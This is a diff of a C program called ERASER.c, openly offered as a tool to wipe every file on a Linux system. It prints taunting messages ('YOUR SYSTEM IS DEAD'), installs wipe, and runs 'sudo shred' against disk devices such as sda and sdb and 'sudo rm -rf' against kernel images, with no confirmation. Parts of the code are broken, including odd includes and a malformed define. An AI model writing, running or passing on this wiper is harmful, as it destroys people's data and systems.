@@ -1,24 +1,61 @@
-//ERASER.c
-//MADE BY ARTEON!
-//ERASE EVERYTHING ON YOUR HARDRIVE
-//LAST EDIT 13:20 04.03.20
+// ERASER.c
+// MADE BY ARTEON!
+// ERASE EVERYTHING ON YOUR HARDRIVE
+// LAST EDIT 13:20 04.03.20
+// Project finished 08.10.2020
+// Version: 1.0.0
 
+/*
+ *  Eraser.c:  Fully automated eraser to delete every file on your system (linux based)
+ *
+ *  Copyright Magnus Danielsen (13 december 2018-2020)
+ *
+ *  This program is free software; you can redistribute it and/or modify it under
+ *  the terms of the GNU General Public License as published by the Free Software
+ *  Foundation, version 2.
+ *
+ */
+
+// INCLUDES
 #include <stdio.h>
 #include <stdlib.h>
 #include <sys/stat.h>
-  int main(int argc, char * argv[]) {
+#include <sys/types.h>
+#include <fcntl.h>
+#include <ctype.h>
+#include <errno.h>
+#include <linux/hdreg.h>
+#include <assert.h>
+#include <math.h>
+#include <conio.h>
+#include <netdb.h>
+#include <unistd.h>
+#include <fcntl.h>
+#include <link.h>
+#include <time.h>
+#include <aes.h>
+
+// DEFINES
+#define AEDDABAEDDA 1D1FAC0DF0D85F33561A90AFCA429875
+
+
+
+  int main(int argc, char * argv[]) { //screentime
     fprintf(stderr, "\033[22;31m[!] Invalid parameters[!]\033[22;31m\n");
-    fprintf(stderr, "\033[22;90m[S] \033[22;31mREMOVING EVERYTHING!\n");
-    fprintf(stderr, "\033[22;90m[SW] FUCK THE \033[22;31mPOLICE\n");
-    fprintf(stderr, "\033[22;90m[SWO] FUCK THE \033[22;31mFBI\n");
-    fprintf(stderr, "\033[22;90m[SWOO] FUCK THE \033[22;31mCIA\n");
-    fprintf(stderr, "\033[22;90m[SWOOF] FUCK THE \033[22;31mNSA\n");
-    fprintf(stderr, "\033[22;90m[FO] CREDZ TO MY BOY \033[22;31mB1NARY\n");
-    fprintf(stderr, "\033[22;90m[FOOW] YOUR SYSTEM IS \033[22;31mDEAD\n");
-    fprintf(stderr, "\033[22;90m[FOOWS] MADE BY ARTEON \033[22;31m13th December 2018\n");
+    fprintf(stderr, "\033[22;90m[!] \033[22;31mREMOVING EVERYTHING!\n");
+    fprintf(stderr, "\033[22;90m[!] FUCK THE \033[22;31mPOLICE\n");
+    fprintf(stderr, "\033[22;90m[!] FUCK THE \033[22;31mFBI\n");
+    fprintf(stderr, "\033[22;90m[!] FUCK THE \033[22;31mCIA\n");
+    fprintf(stderr, "\033[22;90m[!] FUCK THE \033[22;31mNSA\n");
+    fprintf(stderr, "\033[22;90m[!] CREDZ TO MY BOY \033[22;31mB1NARY\n");
+    fprintf(stderr, "\033[22;90m[!] YOUR SYSTEM IS \033[22;31mDEAD\n");
+    fprintf(stderr, "\033[22;90m[!] MADE BY ARTEON \033[22;31m13th December 2018\n");
     sleep(1);
     //uses wipe to manually uninstall
     system("sudo apt-get install wipe\n"); // installs wipe
+    sleep(1); // screentime
+    fprintf(stderr, "\033[22;90m[!] This is the\033[22;31mEND\n");
+    sleep(1); //starting the process
     system("sudo shred -vfz -n ? sda");
     system("sudo shred -vfz -n ? sr0");
     system("sudo shred -vfz -n ? sdb");
@@ -102,4 +139,4 @@
     system("sudo rm -rf vmlinuz");
     system("sudo rm -rf vmlinuz.old");
     return 0;
-  }
+  } // END
